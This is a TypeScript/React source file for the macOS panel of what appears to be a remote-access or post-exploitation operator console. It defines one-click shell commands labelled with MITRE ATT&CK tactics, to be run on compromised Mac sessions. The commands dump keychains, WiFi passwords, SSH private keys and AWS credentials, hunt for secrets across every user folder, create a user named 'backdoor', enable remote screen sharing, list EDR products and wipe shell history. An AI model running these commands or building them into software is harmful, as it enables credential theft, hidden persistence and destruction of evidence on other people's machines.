import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'id / groups',               cmd: 'id && groups',                                  tag: 'T1033' },
      { icon: '💻', label: 'macOS Version',              cmd: 'sw_vers && uname -a',                           tag: 'T1082' },
      { icon: '🖥️', label: 'Hardware (system_profiler)', cmd: 'system_profiler SPHardwareDataType 2>/dev/null | head -20', tag: 'T1082' },
      { icon: '👥', label: 'Local Users (dscl)',         cmd: 'dscl . -list /Users | grep -v "^_"',            tag: 'T1087' },
      { icon: '🔑', label: 'Admin Members',              cmd: 'dscl . -read /Groups/admin GroupMembership 2>/dev/null', tag: 'T1069' },
      { icon: '📋', label: 'Processes',                  cmd: 'ps auxf | head -40',                            tag: 'T1057' },
      { icon: '⚙️', label: 'LaunchAgents',               cmd: 'launchctl list 2>/dev/null | head -30',         tag: 'T1007' },
      { icon: '📦', label: 'Installed Apps',             cmd: 'ls /Applications/ | head -30',                  tag: 'T1518' },
      { icon: '🔒', label: 'SIP Status',                 cmd: 'csrutil status 2>/dev/null',                    tag: 'T1553' },
      { icon: '🛡️', label: 'Gatekeeper',                cmd: 'spctl --status 2>/dev/null',                    tag: 'T1553' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'sudo -l',                    cmd: 'sudo -l 2>&1',                                  tag: 'T1548' },
      { icon: '🔑', label: 'SUID Binaries',              cmd: 'find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null', tag: 'T1548' },
      { icon: '🔐', label: 'Keychain List',              cmd: 'security list-keychains; security dump-keychain 2>/dev/null | head -20', tag: 'T1555' },
      { icon: '📂', label: 'Writable PATH',              cmd: 'for p in $(echo $PATH | tr : " "); do [ -w "$p" ] && echo "WRITABLE: $p"; done', tag: 'T1574' },
      { icon: '⚡', label: 'Writable LaunchDaemons',     cmd: 'for f in /Library/LaunchDaemons/*.plist; do [ -w "$f" ] && echo "WRITABLE: $f"; done 2>/dev/null', tag: 'T1574' },
      { icon: '🐳', label: 'Docker Socket',              cmd: 'ls /var/run/docker.sock 2>/dev/null && echo DOCKER_SOCK_FOUND; docker ps 2>/dev/null | head -5', tag: 'T1611' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '🔑', label: 'Keychain Dump',              cmd: 'security dump-keychain -d login.keychain 2>/dev/null | head -50 || echo needs-user-consent', tag: 'T1555' },
      { icon: '🔒', label: 'Internet Passwords',         cmd: 'security find-internet-password -ga "" 2>&1 | head -20', tag: 'T1555' },
      { icon: '📜', label: 'SSH Keys',                   cmd: 'ls -la ~/.ssh/; cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null | head -10', tag: 'T1552' },
      { icon: '📋', label: 'Shell Histories',            cmd: 'cat ~/.zsh_history ~/.bash_history 2>/dev/null | tail -50', tag: 'T1552' },
      { icon: '🌐', label: 'WiFi Passwords',             cmd: 'for ssid in $(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2); do echo -n "$ssid: "; security find-generic-password -ga "$ssid" 2>&1 | grep "password:"; done', tag: 'T1552' },
      { icon: '🔑', label: 'AWS / Cloud Creds',          cmd: 'cat ~/.aws/credentials ~/.aws/config 2>/dev/null', tag: 'T1552' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Addresses',               cmd: 'ifconfig | grep -E "inet |inet6 "',             tag: 'T1016' },
      { icon: '🔌', label: 'Listening Ports (lsof)',     cmd: 'lsof -i -P -n | grep LISTEN',                   tag: 'T1049' },
      { icon: '🛤️', label: 'Routing Table',             cmd: 'netstat -rn',                                   tag: 'T1016' },
      { icon: '🌍', label: 'DNS (scutil)',               cmd: 'cat /etc/resolv.conf; scutil --dns | head -20', tag: 'T1016' },
      { icon: '🔥', label: 'Firewall Status',            cmd: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null', tag: 'T1562' },
      { icon: '📡', label: 'Active Connections',         cmd: 'lsof -i -P -n | grep ESTABLISHED | head -30',   tag: 'T1049' },
      { icon: '🌐', label: 'VPN / utun',                 cmd: 'scutil --nc list 2>/dev/null; ifconfig | grep -A5 utun', tag: 'T1090' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '⚙️', label: 'LaunchAgents (user)',        cmd: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; cat ~/Library/LaunchAgents/*.plist 2>/dev/null | grep -E "Program|Label" | head -20', tag: 'T1543' },
      { icon: '🔧', label: 'LaunchDaemons (root)',       cmd: 'ls -la /Library/LaunchDaemons/ 2>/dev/null | head -20', tag: 'T1543' },
      { icon: '🔌', label: 'Login Items',                cmd: 'osascript -e "tell application \\"System Events\\" to get the name of every login item" 2>/dev/null', tag: 'T1547' },
      { icon: '🏃', label: 'Shell Profile',              cmd: 'cat ~/.zshrc ~/.bash_profile ~/.profile /etc/zshrc 2>/dev/null | head -40', tag: 'T1546' },
      { icon: '👤', label: 'Add Backdoor User',          cmd: 'sudo dscl . -create /Users/backdoor Username backdoor 2>/dev/null && sudo dscl . -create /Users/backdoor UserShell /bin/zsh 2>/dev/null && echo done || echo needs-sudo', tag: 'T1136' },
      { icon: '🗑️', label: 'Clear Shell History',       cmd: 'cat /dev/null > ~/.zsh_history && cat /dev/null > ~/.bash_history && echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'bypass', icon: '🛡️', label: 'SEC BYPASS', atkId: 'TA0005',
    cmds: [
      { icon: '🛡️', label: 'SIP + Gatekeeper',          cmd: 'csrutil status; spctl --status',                tag: 'T1553' },
      { icon: '🔒', label: 'TCC DB (user)',               cmd: 'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service,client,allowed FROM access" 2>/dev/null | head -20 || echo needs-FDA', tag: 'T1562' },
      { icon: '🔍', label: 'AV / EDR Products',          cmd: 'ls /Applications | grep -i "CrowdStrike\\|SentinelOne\\|Jamf\\|Carbon\\|Cortex\\|Malwarebytes"', tag: 'T1518' },
      { icon: '🌍', label: 'MDM Enrollment',             cmd: 'profiles status -type enrollment 2>/dev/null',  tag: 'T1553' },
      { icon: '🧩', label: 'AMFI / nvram',               cmd: 'nvram boot-args 2>/dev/null; sysctl kern.amfiresult 2>/dev/null', tag: 'T1553' },
    ],
  },
  {
    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
    cmds: [
      { icon: '🔑', label: 'SSH Keys (all users)',   cmd: 'find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs ls -la 2>/dev/null; cat /Users/*/.ssh/known_hosts 2>/dev/null', tag: 'T1021' },
      { icon: '📡', label: 'SSH Agent Keys',         cmd: 'ssh-add -l 2>/dev/null || echo no-agent; echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"', tag: 'T1021' },
      { icon: '🌐', label: 'ARD / Screen Sharing',   cmd: 'sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate 2>/dev/null; defaults read /Library/Preferences/com.apple.ScreenSharing 2>/dev/null', tag: 'T1021' },
      { icon: '📁', label: 'Mounted Shares',         cmd: 'mount | grep -E "smbfs|afpfs|nfs"; ls /Volumes/ 2>/dev/null',                  tag: 'T1135' },
      { icon: '🔍', label: 'Bonjour Services',       cmd: 'dns-sd -B _services._dns-sd._udp local 2>/dev/null & sleep 3; kill %1 2>/dev/null', tag: 'T1046' },
      { icon: '🔐', label: 'Keychain SSH Keys',      cmd: 'security find-generic-password -a $(whoami) -s "SSH" -w 2>/dev/null; security dump-keychain | grep -A4 "SSH" | head -20', tag: 'T1555' },
    ],
  },
  {
    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
    cmds: [
      { icon: '🔑', label: 'Hunt SSH Keys',          cmd: 'find /Users -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null | head -20', tag: 'T1552' },
      { icon: '🌐', label: 'Hunt AWS / Cloud Creds', cmd: 'cat /Users/*/.aws/credentials /Users/*/.aws/config 2>/dev/null; find /Users -name "credentials" -path "*/.aws/*" 2>/dev/null', tag: 'T1552' },
      { icon: '💾', label: 'Hunt DB Files',          cmd: 'find /Users /opt /var -name "*.db" -o -name "*.sqlite" 2>/dev/null | grep -v proc | head -20', tag: 'T1005' },
      { icon: '📄', label: 'Hunt Passwords',         cmd: 'grep -rli "password\\|passwd\\|secret\\|api_key\\|token" /Users/*/Documents /Users/*/Desktop 2>/dev/null | head -20', tag: 'T1552' },
      { icon: '🔐', label: 'Hunt KeePass',           cmd: 'find /Users -name "*.kdbx" -o -name "*.kdb" 2>/dev/null | head -10',           tag: 'T1552' },
      { icon: '🐳', label: 'Hunt Docker Secrets',    cmd: 'find /Users -name "docker-compose*.yml" -o -name ".env" 2>/dev/null | xargs grep -l "password\\|secret" 2>/dev/null | head -10', tag: 'T1552' },
      { icon: '🍎', label: 'Hunt iCloud / Keychain', cmd: 'find /Users/*/Library/Keychains -name "*.db" 2>/dev/null | head -10; ls /Users/*/Library/Mobile\\ Documents 2>/dev/null', tag: 'T1555' },
    ],
  },
]

function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentUnix(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'macOS',
  icon:       '🍎',
  prompt:     '%',
  filter:     (s: Session) => {
    const os = (s.os ?? '').toLowerCase()
    return ['darwin','macos','mac os','osx'].some(k => os.includes(k))
  },
  modules:    MODULES,
  defaultFs:  '/',
  joinPath:   joinUnix,
  parentPath: parentUnix,
  quickCmds: [
    { icon: '👤', label: 'id / groups',    cmd: 'id && groups' },
    { icon: '💻', label: 'macOS Version',  cmd: 'sw_vers && uname -a' },
    { icon: '📋', label: 'Processes',      cmd: 'ps auxf | head -40' },
    { icon: '🌐', label: 'IP / Ports',     cmd: 'ifconfig | grep inet; lsof -i -P -n | grep LISTEN | head -20' },
    { icon: '🎭', label: 'sudo -l',        cmd: 'sudo -l 2>&1' },
    { icon: '🔒', label: 'SIP Status',     cmd: 'csrutil status' },
    { icon: '🔑', label: 'Keychain List',  cmd: 'security list-keychains' },
    { icon: '🏠', label: 'Home Dir',       cmd: 'ls -la ~/' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function MacOS({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
